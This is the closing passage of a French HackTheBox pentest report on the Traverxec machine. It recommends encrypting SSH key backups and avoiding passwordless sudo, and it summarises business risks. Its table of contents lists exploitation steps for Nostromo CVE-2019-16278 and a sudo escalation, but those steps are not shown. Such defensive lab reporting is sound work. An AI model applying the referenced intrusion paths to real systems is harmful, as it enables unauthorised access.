<p>Rappel : La notation <span class="mathjax"><span class="MathJax_Preview" style="color: inherit;"></span><span id="MathJax-Element-12-Frame" class="mjx-chtml MathJax_CHTML" tabindex="0" style="font-size: 127%; position: relative;" data-mathml="<math xmlns=&quot;http://www.w3.org/1998/Math/MathML&quot;><mo stretchy=&quot;false&quot;>(</mo><mi>x</mi><msub><mo stretchy=&quot;false&quot;>)</mo><mi>y</mi></msub></math>" role="presentation"><span id="MJXc-Node-168" class="mjx-math" aria-hidden="true"><span id="MJXc-Node-169" class="mjx-mrow"><span id="MJXc-Node-170" class="mjx-mo"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.445em; padding-bottom: 0.593em;">(</span></span><span id="MJXc-Node-171" class="mjx-mi"><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.199em; padding-bottom: 0.298em;">x</span></span><span id="MJXc-Node-172" class="mjx-msubsup"><span class="mjx-base"><span id="MJXc-Node-173" class="mjx-mo"><span class="mjx-char MJXc-TeX-main-R" style="padding-top: 0.445em; padding-bottom: 0.593em;">)</span></span></span><span class="mjx-sub" style="font-size: 70.7%; vertical-align: -0.212em; padding-right: 0.071em;"><span id="MJXc-Node-174" class="mjx-mi" style=""><span class="mjx-char MJXc-TeX-math-I" style="padding-top: 0.199em; padding-bottom: 0.495em; padding-right: 0.006em;">y</span></span></span></span></span></span><span class="MJX_Assistive_MathML" role="presentation"><math xmlns="http://www.w3.org/1998/Math/MathML"><mo stretchy="false">(</mo><mi>x</mi><msub><mo stretchy="false">)</mo><mi>y</mi></msub></math></span></span><script type="math/tex" id="MathJax-Element-12">(x)_y</script></span> signifie : le nombre x en utilisant la base y.<br>
Si la notion de “base” n’est pas claire, <a href="https://fr.wikipedia.org/wiki/Base_(arithm%C3%A9tique)" target="_blank" rel="noopener">cette page wikipédia</a> permettra d’éclaircir le sujet.</p>
</blockquote><p>Pour le sujet du fichier d’archive contenant les clés privées ssh, il est préférable de chiffrer ce type de sauvegarde sensibles avec un mot de passe fort.</p><p>Voici une commande qui permettrait chiffrer l’archive de clés ssh :<br>
<code>openssl enc -aes-256-cbc -salt -in file.tar -out file.tar.enc -k PASS</code></p><p>Et voici la commande pour le déchiffrer :<br>
<code>openssl enc -aes-256-cbc -d -in file.txt.enc -out file.txt -k PASS</code></p><p>Commandes provenant de la <a href="https://www.shellhacks.com/encrypt-decrypt-file-password-openssl/" target="_blank" rel="noopener">source suivante</a>.</p><p>L’utilisation d’un mot de passe fort pour la passphrase de la clé ssh aurait pu bloquer l’attaque.</p><p>Il est recommandé de se baser sur <a href="https://www.ssi.gouv.fr/administration/precautions-elementaires/calculer-la-force-dun-mot-de-passe/" target="_blank" rel="noopener">le site de l’ANSSI</a> pour vérifier la force des mots de passes et appliquer une politique de mot de passe fort dans la PSSI.</p><p>Pour simplifier l’utilisation de mots de passes forts, il est pertinent d’utiliser un gestionnaire de mot de passe tel que <a href="https://keepass.info/" target="_blank" rel="noopener">KeePass2</a>.</p><h3 id="Droits-sudo"><a class="anchor hidden-xs" href="#Droits-sudo" title="Droits-sudo"><span class="octicon octicon-link"></span></a>Droits sudo</h3><p>La commande sudo est à la fois puissante mais dangereuse dans le cas d’une mauvaise configuration.</p><p>L’utilisation de sudo sans mot de passe peut paraitre pratique, mais créé un grand risque en terme de sécurité.</p><p>Afin de vérifier si une commande avec les droits sudo sans mot de passe permet une escalade de privilège, on peut se référer à <a href="https://gtfobins.github.io/" target="_blank" rel="noopener">GTFO Bins</a>, en sélectionnant la catégorie <code>sudo</code>.</p><p>Si la commande que vous souhaitiez coupler avec sudo sans mot de passe apparait, il sera préférable d’utiliser un mot de passe.</p><p>En général, un gain de temps avec l’automatisation et le passage à sudo sans mot de passe simplifie la vie d’un développeur/administrateur système, mais diminue considérablement la sécurité de l’entreprise.</p><h3 id="Bonnes-pratiques-déjà-adoptées-à-conserver"><a class="anchor hidden-xs" href="#Bonnes-pratiques-déjà-adoptées-à-conserver" title="Bonnes-pratiques-déjà-adoptées-à-conserver"><span class="octicon octicon-link"></span></a>Bonnes pratiques déjà adoptées à conserver</h3><p>Pour finir, il est important de noter que certaines bonnes pratiques étaient mises en place sur la machine, il est important de les conserver :</p><ul>
<li>Aucune ré-utilisation de mots de passe.</li>
<li>Utilisation des chemins absolus dans les scripts.</li>
</ul><h2 id="Synthèse-managériale"><a class="anchor hidden-xs" href="#Synthèse-managériale" title="Synthèse-managériale"><span class="octicon octicon-link"></span></a>Synthèse managériale</h2><p>Le résultat de cet audit met en lumière plusieurs risques métiers notables :</p><ol>
<li>L’utilisateur malveillant est en capacité de s’installer de manière durable sur la machine attaquée.</li>
<li>L’utilisateur malveillant est en capacité d’arrêter à tous moments les applications métiers et/ou des services d’infrastructures régis par ceserveur.</li>
<li>L’utilisateur malveillant est en capacité d’effacer ses traces sur le système d’information (modification des logs avec les droits root).</li>
<li>L’utilisateur malveillant est potentiellement en capacité de mobiliser les services du client pour réaliser des tâches en son nom (ex : installation de crypto-miner, ajouter la machine à son bot-net).</li>
<li>L’utilisateur malveillant peut pivoter depuis cette machine vers d’autres machines sur le même réseau que le serveur vulnérable.</li>
</ol><hr><p><a href="http://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" rel="noopener"><img alt="Creative Commons License" style="border-width:0" src="https://i.creativecommons.org/l/by-nc-nd/4.0/88x31.png"></a><br>This work is licensed under a <a href="http://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" rel="noopener">Creative Commons Attribution-NonCommercial-NoDerivatives 4.0 International License</a>.</p></div>
    <div class="ui-toc dropup unselectable hidden-print" style="display:none;">
        <div class="pull-right dropdown">
            <a id="tocLabel" class="ui-toc-label btn btn-default" data-toggle="dropdown" href="#" role="button" aria-haspopup="true" aria-expanded="false" title="Table of content">
                <i class="fa fa-bars"></i>
            </a>
            <ul id="ui-toc" class="ui-toc-dropdown dropdown-menu" aria-labelledby="tocLabel">
                <div class="toc"><ul class="nav">
<li class=""><a href="#HackTheBox-2019---Pentest-Traverxec" title="HackTheBox 2019 - [Pentest] Traverxec">HackTheBox 2019 - [Pentest] Traverxec</a><ul class="nav">
<li><a href="#Périmètre-d’intervention" title="Périmètre d’intervention">Périmètre d’intervention</a></li>
<li><a href="#Outils-et-méthodes-utilisés" title="Outils et méthodes utilisés">Outils et méthodes utilisés</a></li>
<li><a href="#Phase-de-reconnaissance" title="Phase de reconnaissance">Phase de reconnaissance</a><ul class="nav">
<li><a href="#Scan-actif" title="Scan actif">Scan actif</a></li>
</ul>
</li>
<li><a href="#Recherche-de-vulnérabilité" title="Recherche de vulnérabilité">Recherche de vulnérabilité</a><ul class="nav">
<li><a href="#Recherche-de-vulnérabilité-en-sources-ouvertes" title="Recherche de vulnérabilité en sources ouvertes">Recherche de vulnérabilité en sources ouvertes</a></li>
</ul>
</li>
<li><a href="#Phase-d’exploitation-Utilisateur" title="Phase d’exploitation Utilisateur">Phase d’exploitation Utilisateur</a><ul class="nav">
<li><a href="#www-data---faille-du-service-nostromo" title="www-data - faille du service nostromo">www-data - faille du service nostromo</a></li>
<li><a href="#Compte-david---mauvaise-configuration-de-droits-et-mot-de-passe-faible-d’une-clé-privée-ssh" title="Compte david - mauvaise configuration de droits et mot de passe faible d’une clé privée ssh">Compte david - mauvaise configuration de droits et mot de passe faible d’une clé privée ssh</a></li>
</ul>
</li>
<li><a href="#Phase-d’exploitation-Root" title="Phase d’exploitation Root">Phase d’exploitation Root</a><ul class="nav">
<li><a href="#Compte-root---Elévation-de-privilège-via-sudo-sans-mot-de-passe" title="Compte root - Elévation de privilège via sudo sans mot de passe">Compte root - Elévation de privilège via sudo sans mot de passe</a></li>
</ul>
</li>
<li><a href="#Analyse-de-risque" title="Analyse de risque">Analyse de risque</a><ul class="nav">
<li><a href="#Nostromo-CVE-2019-16278" title="Nostromo CVE 2019-16278">Nostromo CVE 2019-16278</a></li>
<li><a href="#Problèmes-de-configuration-de-droits-de-fichiers" title="Problèmes de configuration de droits de fichiers">Problèmes de configuration de droits de fichiers</a></li>
<li><a href="#Problèmes-de-configuration-de-sudo" title="Problèmes de configuration de sudo">Problèmes de configuration de sudo</a></li>
</ul>
</li>
<li><a href="#Recommandations" title="Recommandations">Recommandations</a><ul class="nav">
<li><a href="#Nostromo" title="Nostromo">Nostromo</a></li>
<li><a href="#Droits-de-fichier-et-Sauvegardes" title="Droits de fichier et Sauvegardes">Droits de fichier et Sauvegardes</a></li>
<li><a href="#Droits-sudo" title="Droits sudo">Droits sudo</a></li>
<li><a href="#Bonnes-pratiques-déjà-adoptées-à-conserver" title="Bonnes pratiques déjà adoptées à conserver">Bonnes pratiques déjà adoptées à conserver</a></li>
</ul>
</li>
<li><a href="#Synthèse-managériale" title="Synthèse managériale">Synthèse managériale</a></li>
</ul>
</li>
</ul>
</div><div class="toc-menu"><a class="expand-toggle" href="#">Expand all</a><a class="back-to-top" href="#">Back to top</a><a class="go-to-bottom" href="#">Go to bottom</a></div>
            </ul>
        </div>
    </div>
    <div id="ui-toc-affix" class="ui-affix-toc ui-toc-dropdown unselectable hidden-print" data-spy="affix" style="top:17px;display:none;" null null>
        <div class="toc"><ul class="nav">
<li class=""><a href="#HackTheBox-2019---Pentest-Traverxec" title="HackTheBox 2019 - [Pentest] Traverxec">HackTheBox 2019 - [Pentest] Traverxec</a><ul class="nav">
<li><a href="#Périmètre-d’intervention" title="Périmètre d’intervention">Périmètre d’intervention</a></li>
<li><a href="#Outils-et-méthodes-utilisés" title="Outils et méthodes utilisés">Outils et méthodes utilisés</a></li>
<li><a href="#Phase-de-reconnaissance" title="Phase de reconnaissance">Phase de reconnaissance</a><ul class="nav">
<li><a href="#Scan-actif" title="Scan actif">Scan actif</a></li>
</ul>
</li>
<li><a href="#Recherche-de-vulnérabilité" title="Recherche de vulnérabilité">Recherche de vulnérabilité</a><ul class="nav">
<li><a href="#Recherche-de-vulnérabilité-en-sources-ouvertes" title="Recherche de vulnérabilité en sources ouvertes">Recherche de vulnérabilité en sources ouvertes</a></li>
</ul>
</li>
<li><a href="#Phase-d’exploitation-Utilisateur" title="Phase d’exploitation Utilisateur">Phase d’exploitation Utilisateur</a><ul class="nav">
<li><a href="#www-data---faille-du-service-nostromo" title="www-data - faille du service nostromo">www-data - faille du service nostromo</a></li>
<li><a href="#Compte-david---mauvaise-configuration-de-droits-et-mot-de-passe-faible-d’une-clé-privée-ssh" title="Compte david - mauvaise configuration de droits et mot de passe faible d’une clé privée ssh">Compte david - mauvaise configuration de droits et mot de passe faible d’une clé privée ssh</a></li>
</ul>
</li>
<li><a href="#Phase-d’exploitation-Root" title="Phase d’exploitation Root">Phase d’exploitation Root</a><ul class="nav">
<li><a href="#Compte-root---Elévation-de-privilège-via-sudo-sans-mot-de-passe" title="Compte root - Elévation de privilège via sudo sans mot de passe">Compte root - Elévation de privilège via sudo sans mot de passe</a></li>
</ul>
</li>
<li><a href="#Analyse-de-risque" title="Analyse de risque">Analyse de risque</a><ul class="nav">
<li><a href="#Nostromo-CVE-2019-16278" title="Nostromo CVE 2019-16278">Nostromo CVE 2019-16278</a></li>
<li><a href="#Problèmes-de-configuration-de-droits-de-fichiers" title="Problèmes de configuration de droits de fichiers">Problèmes de configuration de droits de fichiers</a></li>
<li><a href="#Problèmes-de-configuration-de-sudo" title="Problèmes de configuration de sudo">Problèmes de configuration de sudo</a></li>
</ul>
</li>
<li><a href="#Recommandations" title="Recommandations">Recommandations</a><ul class="nav">
<li><a href="#Nostromo" title="Nostromo">Nostromo</a></li>
<li><a href="#Droits-de-fichier-et-Sauvegardes" title="Droits de fichier et Sauvegardes">Droits de fichier et Sauvegardes</a></li>
<li><a href="#Droits-sudo" title="Droits sudo">Droits sudo</a></li>
<li><a href="#Bonnes-pratiques-déjà-adoptées-à-conserver" title="Bonnes pratiques déjà adoptées à conserver">Bonnes pratiques déjà adoptées à conserver</a></li>
</ul>
</li>
<li><a href="#Synthèse-managériale" title="Synthèse managériale">Synthèse managériale</a></li>
</ul>
</li>
</ul>
</div><div class="toc-menu"><a class="expand-toggle" href="#">Expand all</a><a class="back-to-top" href="#">Back to top</a><a class="go-to-bottom" href="#">Go to bottom</a></div>
    </div>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.1.1/jquery.min.js" integrity="sha256-hVVnYaiADRTO2PzUGmuLJr8BLUSjGIZsDYGmIJLv2b8=" crossorigin="anonymous"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha256-U5ZEeKfGNOja007MMD3YBI0A3OSZOQbeG6z2f2Y0hu8=" crossorigin="anonymous" defer></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/gist-embed/2.6.0/gist-embed.min.js" integrity="sha256-KyF2D6xPIJUW5sUDSs93vWyZm+1RzIpKCexxElmxl8g=" crossorigin="anonymous" defer></script>
    <script>
        var markdown = $(".markdown-body");
        //smooth all hash trigger scrolling
        function smoothHashScroll() {
            var hashElements = $("a[href^='#']").toArray();
            for (var i = 0; i < hashElements.length; i++) {
                var element = hashElements[i];
                var $element = $(element);
                var hash = element.hash;
                if (hash) {
                    $element.on('click', function (e) {
                        // store hash
                        var hash = this.hash;
                        if ($(hash).length <= 0) return;
                        // prevent default anchor click behavior
                        e.preventDefault();
                        // animate
                        $('body, html').stop(true, true).animate({
                            scrollTop: $(hash).offset().top
                        }, 100, "linear", function () {
                            // when done, add hash to url
                            // (default click behaviour)
                            window.location.hash = hash;
                        });
                    });
                }
            }
        }

        smoothHashScroll();
        var toc = $('.ui-toc');
        var tocAffix = $('.ui-affix-toc');
        var tocDropdown = $('.ui-toc-dropdown');
        //toc
        tocDropdown.click(function (e) {
            e.stopPropagation();
        });

        var enoughForAffixToc = true;

        function generateScrollspy() {
            $(document.body).scrollspy({
                target: ''
            });
            $(document.body).scrollspy('refresh');
            if (enoughForAffixToc) {
                toc.hide();
                tocAffix.show();
            } else {
                tocAffix.hide();
                toc.show();
            }
            $(document.body).scroll();
        }

        function windowResize() {
            //toc right
            var paddingRight = parseFloat(markdown.css('padding-right'));
            var right = ($(window).width() - (markdown.offset().left + markdown.outerWidth() - paddingRight));
            toc.css('right', right + 'px');
            //affix toc left
            var newbool;
            var rightMargin = (markdown.parent().outerWidth() - markdown.outerWidth()) / 2;
            //for ipad or wider device
            if (rightMargin >= 133) {
                newbool = true;
                var affixLeftMargin = (tocAffix.outerWidth() - tocAffix.width()) / 2;
                var left = markdown.offset().left + markdown.outerWidth() - affixLeftMargin;
                tocAffix.css('left', left + 'px');
            } else {
                newbool = false;
            }
            if (newbool != enoughForAffixToc) {
                enoughForAffixToc = newbool;
                generateScrollspy();
            }
        }
        $(window).resize(function () {
            windowResize();
        });
        $(document).ready(function () {
            windowResize();
            generateScrollspy();
        });

        //remove hash
        function removeHash() {
            window.location.hash = '';
        }

        var backtotop = $('.back-to-top');
        var gotobottom = $('.go-to-bottom');

        backtotop.click(function (e) {
            e.preventDefault();
            e.stopPropagation();
            if (scrollToTop)
                scrollToTop();
            removeHash();
        });
        gotobottom.click(function (e) {
            e.preventDefault();
            e.stopPropagation();
            if (scrollToBottom)
                scrollToBottom();
            removeHash();
        });

        var toggle = $('.expand-toggle');
        var tocExpand = false;

        checkExpandToggle();
        toggle.click(function (e) {
            e.preventDefault();
            e.stopPropagation();
            tocExpand = !tocExpand;
            checkExpandToggle();
        })

        function checkExpandToggle () {
            var toc = $('.ui-toc-dropdown .toc');
            var toggle = $('.expand-toggle');
            if (!tocExpand) {
                toc.removeClass('expand');
                toggle.text('Expand all');
            } else {
                toc.addClass('expand');
                toggle.text('Collapse all');
            }
        }

        function scrollToTop() {
            $('body, html').stop(true, true).animate({
                scrollTop: 0
            }, 100, "linear");
        }

        function scrollToBottom() {
            $('body, html').stop(true, true).animate({
                scrollTop: $(document.body)[0].scrollHeight
            }, 100, "linear");
        }
    </script>
</body>

</html>
